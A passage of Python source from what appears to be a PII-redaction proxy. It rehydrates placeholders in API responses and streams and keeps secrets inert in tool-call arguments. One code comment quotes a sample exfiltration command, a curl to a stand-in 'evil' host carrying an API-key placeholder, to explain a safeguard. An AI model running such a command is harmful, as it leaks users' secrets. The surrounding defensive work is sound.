    # LAYER 2 -- top-level `metadata` (FIX-ROUND-3 MEDIUM leak): the Responses API carries a user-supplied
    # metadata map ({string: string}) that is round-tripped on the request/response. Its string values can embed
    # PII and were never swept -> forwarded RAW upstream. The recursive sweep surfaces each value (the deny-list
    # leaves any structural-looking key intact) for span-based redaction. kind 'tool_result' so it scans WITHOUT
    # seeding session derivation (only `instructions` / a system-role item should set sys_text in redact_body).
    metadata = body.get('metadata')
    if isinstance(metadata, dict):
        # top-level metadata is USER DATA top-to-bottom (a {string: string} map the caller round-trips). A key
        # named 'customer_id'/'name'/... here is PII, NOT a structural token, so the walk starts struct_scope=False
        # and never consults the deny-list (FIX-ROUND-4-R2 LEAK 1).
        _recurse_collect(metadata, 'tool_result', fields, notes, claimed, struct_scope=False)

    # Record the file-passthrough notes on a private, NON-WIRE key. pop_file_passthrough_notes() reads + REMOVES
    # it so the marker never reaches the upstream body. It is stripped here only if a prior run left it; the egress
    # route is responsible for popping it before forwarding (see /v1/responses).
    body.pop('_ossredact_file_notes', None)
    if notes:
        body['_ossredact_file_notes'] = notes
    return fields


def pop_file_passthrough_notes(body):
    """Read AND REMOVE the structured notes recorded by extract_text_fields_responses(body): a list of
    {mime, filename, reason} for every inline file payload whose bytes were NOT scanned (binary/undetermined or
    undecodable text). The egress logs these so a binary-file bypass is a DOCUMENTED limitation, never silent --
    and popping guarantees the private marker is NEVER forwarded upstream. Returns [] when none were recorded."""
    notes = body.pop('_ossredact_file_notes', None)
    return notes if isinstance(notes, list) else []


# ---------------------------------------------------------------------------
# Pure rehydrate helpers (mirror egress_proxy.py / openai_adapter.py).
# ---------------------------------------------------------------------------
def rehydrate_text(s, replay):
    if not replay or not isinstance(s, str):
        return s
    tokens = [ph for ph in replay if isinstance(ph, str) and ph in s]
    if not tokens:
        return s
    pat = re.compile('|'.join(re.escape(ph) for ph in sorted(tokens, key=len, reverse=True)))
    return pat.sub(lambda m: replay[m.group()], s)


def _rehydrate_json(v, replay):
    if isinstance(v, str):
        return rehydrate_text(v, replay)
    if isinstance(v, list):
        return [_rehydrate_json(x, replay) for x in v]
    if isinstance(v, dict):
        # rehydrate the object KEY too (FIX-ROUND-4-R2 LEAK 2 symmetry): a PII object key redacted to a placeholder
        # on the request side must restore to the original key here. Keys are restored at the VALUE level (parse ->
        # rehydrate -> re-dump) so an original key with quotes/backslashes re-escapes safely on json.dumps.
        # COLLISION-SAFE (FIX-ROUND-4-R3 FIX C, was the silent-drop dict comprehension :940): a plain
        # {rehydrate(k): ... for k in v} would DROP an entry when two distinct keys rehydrate to the same string.
        # Build explicitly preserving insertion order and disambiguate a colliding rehydrated key so no entry is
        # dropped (degenerate: distinct placeholders map to distinct values, so a clash needs a pre-existing literal).
        rebuilt = {}
        for k, x in v.items():
            nk = rehydrate_text(k, replay) if isinstance(k, str) else k
            if nk in rebuilt:
                nk = _disambiguate_key(nk if isinstance(nk, str) else k, rebuilt, k)
            rebuilt[nk] = _rehydrate_json(x, replay)
        return rebuilt
    return v


class _DupObj:
    """A JSON object that carries DUPLICATE keys -- a plain dict cannot hold them, so the duplicate-preserving
    parse below wraps such an object in this list-of-pairs container. Used on the response-side duplicate-key
    rehydration fallback (FIX-ROUND-4-R3-R2 ITEM 4) AND the request-side extraction dup path (_collect_dup_args,
    FIX-ROUND-5-R6); ordinary (no-duplicate) objects stay plain dicts on the response side.
    Pairs are MUTABLE [key, value] lists (not tuples) so the request-side _DupSlot can redact a value/key in place;
    the response side only READS pairs, so the list-vs-tuple change is transparent to it."""
    __slots__ = ('pairs',)

    def __init__(self, pairs):
        self.pairs = [list(p) for p in pairs]   # [key, value] lists, duplicates preserved in order


def _dup_preserving_pairs(pairs):
    """json.loads object_pairs_hook: return a plain dict when an object has NO duplicate keys (the common case, so
    re-serialization is identical to a normal parse), or a _DupObj preserving ALL pairs in order when it does."""
    seen = set()
    has_dup = False
    for k, _ in pairs:
        if k in seen:
            has_dup = True
            break
        seen.add(k)
    if has_dup:
        return _DupObj(list(pairs))
    return dict(pairs)


def _dump_rehydrated_dup_safe(v, replay):
    """Serialize a structure parsed by _dup_preserving_pairs to a VALID JSON string while rehydrating every string
    KEY and VALUE through replay. JSON-safe by construction: every key and scalar value is emitted via json.dumps,
    so a rehydrated value/key with quotes/backslashes is re-escaped (the old duplicate-key fallback did a blind
    rehydrate_text substring swap, which produced MALFORMED JSON whenever a replay value carried a quote/backslash --
    FIX-ROUND-4-R3-R2 ITEM 4). Duplicate keys are preserved (a _DupObj emits ALL pairs, so no entry is dropped)."""
    if isinstance(v, _DupObj):
        # duplicates at THIS level: emit EVERY pair (no entry dropped). No key-collision disambiguation is applied --
        # preserving the duplicate keys verbatim is the whole point of the fallback (the upstream sent them).
        parts = []
        for k, x in v.pairs:
            nk = rehydrate_text(k, replay) if isinstance(k, str) else k
            parts.append(json.dumps(nk, ensure_ascii=False) + ': ' + _dump_rehydrated_dup_safe(x, replay))
        return '{' + ', '.join(parts) + '}'
    if isinstance(v, dict):
        # no duplicates at THIS level, but a VALUE may still be a nested _DupObj (json.dumps can't serialize one), so
        # we recurse per value rather than delegating the whole dict to json.dumps. COLLISION-SAFE on the rehydrated
        # KEY (FIX C parity): two placeholder keys rehydrating to the same string must not drop an entry.
        seen_keys = set()
        parts = []
        for k, x in v.items():
            nk = rehydrate_text(k, replay) if isinstance(k, str) else k
            if nk in seen_keys:
                nk = _disambiguate_key(nk if isinstance(nk, str) else k, {kk: None for kk in seen_keys}, k)
            seen_keys.add(nk)
            parts.append(json.dumps(nk, ensure_ascii=False) + ': ' + _dump_rehydrated_dup_safe(x, replay))
        return '{' + ', '.join(parts) + '}'
    if isinstance(v, list):
        return '[' + ', '.join(_dump_rehydrated_dup_safe(x, replay) for x in v) + ']'
    if isinstance(v, str):
        return json.dumps(rehydrate_text(v, replay), ensure_ascii=False)
    # numbers / bools / null: dump as-is (no placeholder ever lives in a non-string JSON scalar)
    return json.dumps(v, ensure_ascii=False)


def rehydrate_json_string(acc, replay):
    """Rehydrate placeholders inside a tool-call arguments JSON string at the VALUE level AND the KEY level (parse ->
    walk -> replace -> re-serialize) so a real value/key with quotes/backslashes can't break the JSON. Falls back to
    plain text rehydrate if the accumulator isn't valid JSON.

    DUPLICATE-KEY SAFETY (FIX-ROUND-4-R2 MEDIUM :832, hardened FIX-ROUND-4-R3-R2 ITEM 4): a plain json.loads collapses
    duplicate object keys to the LAST value, so an upstream arguments string like
    {"assignee":"<NAME_001>","assignee":"<NAME_002>"} would lose the first entry BEFORE rehydration and silently drop a
    value. We parse with _dup_preserving_pairs: a NO-duplicate object is a plain dict (the common path, re-serialized
    via _rehydrate_json + json.dumps exactly as before), and a duplicate-keyed object is a _DupObj preserving ALL pairs.
    Either way we serialize via _dump_rehydrated_dup_safe, which emits every KEY and VALUE through json.dumps -- so the
    duplicate path is now JSON-SAFE: a replay VALUE containing quotes/backslashes is re-escaped instead of being
    blind-substring-swapped into malformed JSON (the prior rehydrate_text fallback corrupted the JSON in exactly that
    case). If the accumulator is not valid JSON at all, fall back to a plain-text placeholder swap (a <LABEL_NNN> token
    carries no quote/backslash, so swapping placeholders in a non-JSON free-form string is safe)."""
    if not acc or not acc.strip():
        return acc
    # B5: this is ALWAYS tool-argument context (every _is_json_args_key value + the streaming
    # function_call_arguments.done funnel here) -> withhold FLOOR/secret-class tokens (strict: every token) so a
    # secret left in an executed argument stays the inert <LABEL_NNN> literal.
    replay = tool_arg_policy.tool_arg_replay(replay)
    try:
        obj = json.loads(acc, object_pairs_hook=_dup_preserving_pairs)
    except Exception:
        return rehydrate_text(acc, replay)
    return _dump_rehydrated_dup_safe(obj, replay)


def split_safe(carry):
    """(safe_prefix, held_tail): hold back a possible partial placeholder at the tail (an unclosed '<' that
    looks like the start of <LABEL_NNN>). Leave a real '<' (e.g. 'a < b') alone."""
    idx = carry.rfind('<')
    if idx == -1:
        return carry, ''
    tail = carry[idx:]
    if '>' in tail:
        return carry, ''
    if _PH_PREFIX_RE.fullmatch(tail[1:]):
        return carry[:idx], tail
    return carry, ''


# ---------------------------------------------------------------------------
# Non-streaming response rehydration. (Both helpers below delegate to the single recursive walk above so an
# output item / snapshot item of ANY shape -- message, function_call, function_call_output, shell_call_output,
# mcp_call, code_interpreter_call, any future type -- is fully rehydrated, with `arguments` JSON-safe.)
# ---------------------------------------------------------------------------
def _rehydrate_content_part(part, replay):
    """Rehydrate one content part of any shape (delegates to the recursive walk)."""
    if isinstance(part, (dict, list)):
        _rehydrate_recursive(part, replay)


def _rehydrate_item(item, replay):
    """Rehydrate one item from a Responses `output` array OR a stream snapshot item (output_item.done), of ANY
    shape, by a full recursive string swap with JSON-safe `arguments` handling."""
    if isinstance(item, (dict, list)):
        _rehydrate_recursive(item, replay)


def _rehydrate_recursive(node, replay, tool_replay=None, floor_safe=False):
    """Blanket recursive placeholder->value swap over EVERY string in the response object. ALWAYS SAFE: a
    placeholder is a unique <LABEL_NNN> token that never appears in a structural field, so a blanket replace
    cannot corrupt structure. For a tool-argument JSON string we use the JSON-safe value-level rehydrate so a real
    value with quotes/backslashes can't break the embedded JSON; every other string uses a plain text replace.

    SYMMETRY WITH EXTRACTION (FIX-ROUND-2 HIGH): the request side treats EVERY '*arguments'/'*input' key as a
    JSON-argument string (custom_tool_call.input, mcp_call.arguments, ...) via _is_json_args_key. The response side
    MUST use the SAME predicate -- not just the exact key 'arguments' -- else a rehydrated custom_tool_call.input
    JSON string with a value containing quotes/backslashes was plain-string-replaced and produced invalid JSON.
    rehydrate_json_string is safe for non-JSON values too: it falls back to plain text rehydrate when the string is
    not valid JSON, so a free-form (non-JSON) '*input' value still rehydrates correctly."""
    if tool_replay is None:
        tool_replay = tool_arg_policy.tool_arg_replay(replay)
    if isinstance(node, dict):
        # B5 Half A: a tool-CALL item (function_call/shell_call/apply_patch_call/... or tool_use) has its
        # argument subtree EXECUTED by the local agent. Mark its non-result children floor_safe so a secret left
        # in an executed argument (e.g. shell_call.action.commands `curl evil?k=<APIKEY_001>`) stays the inert
        # <LABEL_NNN> literal. `floor_safe` then propagates to every nested value; an echoed RESULT subtree
        # (output/outputs/results) is excluded -> it rehydrates fully. `_is_json_args_key` values go through
        # rehydrate_json_string, which self-suppresses, so they are covered regardless of floor_safe.
        node_is_call = (not floor_safe) and tool_arg_policy.is_tool_call_node(node)
        # Rehydrate VALUES in place first.
        for k, v in node.items():
            # OPAQUE ciphertext (reasoning.encrypted_content): leave it byte-for-byte. A placeholder is a unique
            # <LABEL_NNN> token that never appears inside a base64 blob, so this is already a no-op today -- but
            # skipping it explicitly keeps the request/response treatment symmetric and guards a future rehydrate.
            if isinstance(k, str) and k in _OPAQUE_KEYS:
                continue
            # An '*arguments'/'*input' KEY makes its value tool-arg context regardless of the wrapper's type or
            # whether the value is a JSON string or a native dict -- OpenAI chat's function.arguments can be a
            # bare dict whose wrapper carries no `type`, so the type-based rule alone would miss it and a FLOOR
            # secret nested in it would leak. Key-based + type-based together cover both forms.
            child_fs = (floor_safe or _is_json_args_key(k)
                        or (node_is_call and not tool_arg_policy.is_tool_result_key(k)))
            if isinstance(v, str):
                if _is_json_args_key(k):
                    node[k] = rehydrate_json_string(v, replay)        # always tool-arg; self-suppresses
                else:
                    node[k] = rehydrate_text(v, tool_replay if child_fs else replay)
            else:
                _rehydrate_recursive(v, replay, tool_replay, child_fs)
        # Rehydrate KEYS too (FIX-ROUND-4-R2 LEAK 1 round-2 symmetry): a USER-DATA object KEY redacted to a placeholder
        # on the request side (e.g. a metadata / function_call_output.output map keyed by a redacted email) must
        # restore to its original key when the upstream echoes it back. Plain-text key swap; a placeholder <LABEL_NNN>
        # is a unique token so the swap can never corrupt a structural key. Rebuild ONLY if a key actually changes,
        # preserving insertion order. COLLISION-SAFE (FIX-ROUND-4-R3 FIX C): if a rehydrated key would land on a key
        # ALREADY placed in `rebuilt` (two placeholders mapping to the same value, or a literal sibling already taken),
        # disambiguate the target so NO entry is dropped -- the prior guard checked `nk in node` (the SOURCE dict),
        # which missed the two-placeholders-to-one-value case and silently overwrote the first entry.
        # Keys at THIS node inherit THIS node's context: in a floor_safe (tool-arg) subtree a secret used as an
        # object KEY is withheld too; elsewhere keys use the full map.
        key_replay = tool_replay if floor_safe else replay
        if any(isinstance(k, str) and rehydrate_text(k, key_replay) != k for k in node):
            rebuilt = {}
            for k, v in node.items():
                nk = rehydrate_text(k, key_replay) if isinstance(k, str) else k
                if nk in rebuilt and nk != k:
                    nk = _disambiguate_key(nk if isinstance(nk, str) else k, rebuilt, k)
                rebuilt[nk] = v
            node.clear()
            node.update(rebuilt)
    elif isinstance(node, list):
        for i, v in enumerate(node):
            if isinstance(v, str):
                node[i] = rehydrate_text(v, tool_replay if floor_safe else replay)
            else:
                _rehydrate_recursive(v, replay, tool_replay, floor_safe)
    return node


def rehydrate_responses_response(obj, replay):
    """FULL RECURSIVE walk of the ENTIRE Responses object -- every string value (output items, message content
    parts, function_call/tool arguments, function_call_output output, shell_call_output, mcp_call output, the
    convenience top-level output_text, AND any future response shape) -> swap placeholders back to real values so
    the local client (Codex) sees the originals. Robustly covers all current + future shapes without enumeration;
    `arguments` JSON strings are rehydrated JSON-safely."""
    if not replay:
        return obj
    if not isinstance(obj, (dict, list)):
        return obj
    return _rehydrate_recursive(obj, replay)


# ---------------------------------------------------------------------------
# Streaming (SSE) rehydration. The Responses API streams typed events, each a single `data: {json}` line whose
# JSON object carries its own `type`. Assistant text arrives as `response.output_text.delta` events (fields:
# delta, item_id, output_index, content_index); we rehydrate the delta incrementally with split-safe tail
# buffering -- keyed per (output_index, content_index) -- so a placeholder split across deltas is never
# half-emitted; the held tail is flushed on the matching `response.output_text.done`. (There is deliberately NO
# extra sweep at `response.completed`: a conformant stream always closes each block with its `.done` first, and
# on a truncated/nonconformant stream the held tail is at most a PARTIAL placeholder fragment -- junk bytes, not
# a value -- whose full text the terminal snapshot carries rehydrated anyway; the verified Anthropic reference
# (egress_proxy._transform_event) drops an unterminated block's tail at message_stop the same way -- 2026-07-02
# parity audit.) Tool-call argument fragments arrive as `response.function_call_arguments.delta`; we
# buffer per item_id and emit the full rehydrated JSON on `response.function_call_arguments.done` (a placeholder
# can straddle fragments, and a tool call is only acted on once complete). Terminal `response.completed` /
# `response.output_item.done` carry a full snapshot object -- rehydrate it too so a non-incremental reader is
# also correct. EVERY OTHER text-bearing event is rehydrated by STRUCTURAL SHAPE (not an enumerated allow-list):
# an incremental `.delta`-shaped event (string `delta`) gets the same split-safe buffering keyed per event-base +
# stream coords (refusal/reasoning_summary_text/reasoning_text/mcp_call_arguments/code_interpreter_call_code/
# custom_tool_call_input deltas and any future one); every other event (a `.done` snapshot, content_part.done,
# error body, ...) gets a blanket recursive placeholder swap (always safe -- a <LABEL_NNN> never appears in a
# structural field) with any held delta tail flushed first. Nothing with placeholders passes through unrestored.
# ---------------------------------------------------------------------------
def _data_event(obj):
    return b'data: ' + json.dumps(obj, ensure_ascii=False).encode('utf-8')


def transform_responses_event(raw, replay, carry, tool_acc):
    """Transform one SSE event (bytes). `carry` holds per-(output_index, content_index) text tails;
    `tool_acc` holds per-item_id buffered function-call argument fragments. Returns transformed bytes
    (no trailing blank line) or None to swallow (a buffered fragment held back)."""
    ev_line = None
    data_line = None
    for ln in raw.split(b'\n'):
        ln = ln.rstrip(b'\r')
        if ln.startswith(b'event:'):
            ev_line = ln[6:].strip()
        elif ln.startswith(b'data:'):
            data_line = ln[5:].strip()
    if data_line is None:
        return raw if raw.strip() else None
    if data_line == b'[DONE]':
        return raw
    try:
        obj = json.loads(data_line)
    except Exception:
        return raw

    t = obj.get('type')

    def _prefix(payload):
        # preserve a leading `event:` line if the upstream sent one (the API's SSE has both event: and data:)
        if ev_line is not None:
            return b'event: ' + ev_line + b'\n' + payload
        return payload

    if t == 'response.output_text.delta':
        key = (obj.get('output_index'), obj.get('content_index'))
        piece = obj.get('delta')
        if isinstance(piece, str):
            carry[key] = carry.get(key, '') + piece
            safe, held = split_safe(carry[key])
            carry[key] = held
            obj['delta'] = rehydrate_text(safe, replay)
        return _prefix(_data_event(obj))

    if t == 'response.output_text.done':
        key = (obj.get('output_index'), obj.get('content_index'))
        held = carry.pop(key, '')
        emits = []
        if held:
            flush = dict(obj)
            flush['type'] = 'response.output_text.delta'
            flush['delta'] = rehydrate_text(held, replay)
            flush.pop('text', None)
            emits.append(_prefix(_data_event(flush)))
        if isinstance(obj.get('text'), str):
            obj['text'] = rehydrate_text(obj['text'], replay)
        emits.append(_prefix(_data_event(obj)))
        return b'\n\n'.join(emits)

    # JSON-ARGUMENT STREAM families: function_call_arguments / mcp_call_arguments (payload field `arguments`) AND
    # custom_tool_call_input (payload field `input`), plus any future `*_arguments` / `*_input` family. The delta
    # fragments concatenate into a JSON string. Plain-text rehydrating each fragment would corrupt the JSON if a
    # replay value carries quotes/backslashes (a fragment is not valid JSON on its own), so we BUFFER every fragment
    # keyed by (event-base, item_id) and emit nothing until the matching `.done`, where we JSON-safely rehydrate the
    # FULL accumulated string. Routed by structural SHAPE (the `_arguments` / `_input` base suffix), SYMMETRIC with the
    # request-side _is_json_args_key (which treats both '*arguments' and '*input' as JSON-arg strings) so a streamed
    # custom_tool_call_input is buffered + JSON-safely rehydrated instead of falling through to per-fragment plain-text
    # rehydrate (FIX-ROUND-4-R2 MEDIUM :1033: a placeholder value with quotes/backslashes produced invalid streamed
    # JSON on the old plain-text path). The `_args_field` is whichever JSON-string field this family carries.
    def _json_arg_field(base):
        # the JSON-string payload field for a `*_arguments` family is `arguments`; for a `*_input` family it is `input`.
        if base.endswith('_arguments'):
            return 'arguments'
        if base.endswith('_input'):
            return 'input'
        return None

    def _is_executed_code_base(base):
        # B5: `code_interpreter_call_code` streams the EXECUTED `code` of a code_interpreter_call -- a tool-argument
        # sink (the model writes code that runs locally). It is NOT a JSON-arg family (raw code, not a JSON string),
        # so it stays on the GENERIC incremental .delta/.done path (live code display) rather than the buffer path,
        # but it MUST rehydrate with the FLOOR-suppressed map so a secret is not streamed into executed code. Display
        # text families (reasoning_*_text, refusal, output_text) end in `_text`/`refusal`, never `_code`, so this is
        # precise. Matches the non-streaming walk, which already floor-suppresses code_interpreter_call.code.
        return isinstance(base, str) and base.endswith('_code')

    _args_delta_base = (t[:-len('.delta')] if isinstance(t, str) and t.endswith('.delta') else None)
    if (_args_delta_base is not None and _json_arg_field(_args_delta_base) is not None
            and isinstance(obj.get('delta'), str)):
        akey = (_args_delta_base, obj.get('item_id'))
        tool_acc[akey] = tool_acc.get(akey, '') + obj['delta']
        return None   # buffer; full JSON-safe rehydrated string emitted at .done

    _args_done_base = (t[:-len('.done')] if isinstance(t, str) and t.endswith('.done') else None)
    if _args_done_base is not None and _json_arg_field(_args_done_base) is not None:
        field = _json_arg_field(_args_done_base)
        akey = (_args_done_base, obj.get('item_id'))
        acc = tool_acc.pop(akey, '')
        if not acc and isinstance(obj.get(field), str):
            acc = obj[field]
        obj[field] = rehydrate_json_string(acc, replay)
        return _prefix(_data_event(obj))

    if t in ('response.completed', 'response.incomplete', 'response.failed', 'response.output_item.done'):
        # terminal/snapshot events embed a full object/item -> rehydrate the embedded structure too
        if isinstance(obj.get('response'), dict):
            rehydrate_responses_response(obj['response'], replay)
        item = obj.get('item')
        if isinstance(item, dict):
            _rehydrate_item(item, replay)
        return _prefix(_data_event(obj))

    # ALL OTHER TEXT-BEARING events. A NARROW set of handled types above is a REHYDRATION LEAK for every other
    # event that carries placeholders: refusal.delta/.done, reasoning_summary_text.*, reasoning_text.*,
    # mcp_call_arguments.*, code_interpreter_call_code.*, custom_tool_call_input.*, content_part.done (part.text),
    # error bodies, AND any future text-bearing event. We route by STRUCTURAL SHAPE, not by enumerating names:
    #
    #   (1) An incremental `.delta`-shaped event (a string `delta` field): buffer + split-safe emit exactly like
    #       output_text.delta, so a placeholder split across fragments is never half-rendered. Keyed by the event
    #       base (type minus the .delta/.done suffix) + stream coordinates, namespaced ('aux',) so it can never
    #       collide with the output_text carry keys. The held tail is flushed on the matching `.done`.
    #   (2) Any other event (a `.done` snapshot, content_part.done, error, ...): a blanket recursive placeholder
    #       swap over every string is ALWAYS SAFE (a <LABEL_NNN> token never appears in a structural field). On a
    #       `.done` we first flush+prepend any tail held from the matching delta stream.
    base = t[:-len('.delta')] if isinstance(t, str) and t.endswith('.delta') else None
    if base is not None and isinstance(obj.get('delta'), str):
        ckey = ('aux', base, obj.get('item_id'), obj.get('output_index'), obj.get('content_index'))
        carry[ckey] = carry.get(ckey, '') + obj['delta']
        safe, held = split_safe(carry[ckey])
        carry[ckey] = held
        # executed-code stream (code_interpreter_call_code): floor-suppress; display text uses full replay.
        delta_replay = tool_arg_policy.tool_arg_replay(replay) if _is_executed_code_base(base) else replay
        obj['delta'] = rehydrate_text(safe, delta_replay)
        return _prefix(_data_event(obj))

    done_base = t[:-len('.done')] if isinstance(t, str) and t.endswith('.done') else None
    emits = []
    # executed-code .done (code_interpreter_call_code.done carries the full `code`): floor-suppress the held tail
    # AND the blanket swap below, so a FLOOR secret never lands in streamed executed code (symmetric with the
    # non-streaming walk). Every other family (reasoning/refusal/content_part/error) keeps the full replay.
    done_replay = tool_arg_policy.tool_arg_replay(replay) if _is_executed_code_base(done_base) else replay
    if done_base is not None:
        ckey = ('aux', done_base, obj.get('item_id'), obj.get('output_index'), obj.get('content_index'))
        held = carry.pop(ckey, '')
        if held:
            flush = {'type': done_base + '.delta', 'delta': rehydrate_text(held, done_replay)}
            for k in ('item_id', 'output_index', 'content_index'):
                if k in obj:
                    flush[k] = obj[k]
            emits.append(_prefix(_data_event(flush)))
    _rehydrate_recursive(obj, done_replay)   # blanket safe swap (content_part.done part.text, error body, *.done text)
    emits.append(_prefix(_data_event(obj)))
    return b'\n\n'.join(emits)


async def stream_rehydrate_responses(upstream_aiter, replay):
    carry, tool_acc, buf = {}, {}, b''
    async for chunk in upstream_aiter:
        buf += chunk
        while b'\n\n' in buf:
            raw, buf = buf.split(b'\n\n', 1)
            out = transform_responses_event(raw, replay, carry, tool_acc)
            if out:
                yield out + b'\n\n'
    if buf.strip():
        out = transform_responses_event(buf, replay, carry, tool_acc)
        if out:
            yield out + b'\n\n'


# ---------------------------------------------------------------------------
# Upstream forwarding headers (Responses uses the SAME auth as chat: Bearer + optional org/project/beta).
# The Codex ChatGPT/Codex-PLAN path (requires_openai_auth=true, wire_api=responses) additionally sends
# identity/routing headers the ChatGPT backend needs to authorize plan usage -- chatgpt-account-id (which
# plan account), originator (codex_cli_rs), session_id, and a codex version pin. These are auth/routing
# metadata, NOT request-body PII, so forwarding them to the SAME upstream the request is already bound for is
# not a leak; STRIPPING them silently broke the plan path (the OAuth token alone is rejected without the
# account id). The API-key path never sends them, so this is purely additive there.
FWD_HEADERS_RESPONSES = {'authorization', 'content-type', 'openai-organization', 'openai-project', 'openai-beta',
                         'chatgpt-account-id', 'originator', 'session_id', 'openai-sentinel-token',
                         'x-codex-version', 'codex-version', 'user-agent'}
# user-agent (2026-06-21): chatgpt.com/backend-api/codex sits behind WAF/bot protection that inspects the client
# UA. The original allowlist dropped it, so httpx sent `user-agent: python-httpx` -- a textbook bot signal that
# the platform API tolerates but the ChatGPT backend may challenge. Forward the genuine Codex CLI UA + any
# Stainless telemetry verbatim so the plan request presents as the real Codex client. Never pin a fake UA.
FWD_HEADER_PREFIXES_RESPONSES = ('x-stainless-',)


def fwd_headers_responses(req):
    return {k: v for k, v in req.headers.items()
            if k.lower() in FWD_HEADERS_RESPONSES or k.lower().startswith(FWD_HEADER_PREFIXES_RESPONSES)}
